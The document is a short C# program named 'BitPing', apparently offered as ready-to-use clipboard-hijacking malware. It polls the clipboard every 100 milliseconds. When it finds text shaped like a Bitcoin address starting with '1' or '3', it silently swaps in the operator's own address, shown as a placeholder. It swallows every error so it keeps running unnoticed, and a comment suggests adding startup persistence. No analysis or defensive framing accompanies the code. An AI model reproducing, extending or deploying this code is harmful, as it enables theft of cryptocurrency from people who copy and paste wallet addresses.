using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;

namespace BitPing
{
    static class Program
    {
		/*
		You Can Customize Like, startup support, etc..
		*/
        internal static string Bitcoin = "Your' Bitcoin Here!";
        [STAThread]
        static void Main(){
            string Temp = null;
            bool Status;
            do{
                try{
                    Temp = Clipboard.GetText();
                    Status = GetCheck(Temp);
                    switch (Status){
                        case true:
                            Clipboard.SetText(Bitcoin);
                            break;
                        case false:
                            break;
                    }
                    Thread.Sleep(100);
                }
                catch (Exception){
				}
            }while (true);
        }
        static bool GetCheck(string Temp){
            if (Temp.Length < 26 || Temp.Length > 35 || Temp.Substring(0, 1) != "1" && Temp.Substring(0, 1) != "3")
            { return false;}
            else
            {return true;}
        }
    }
}
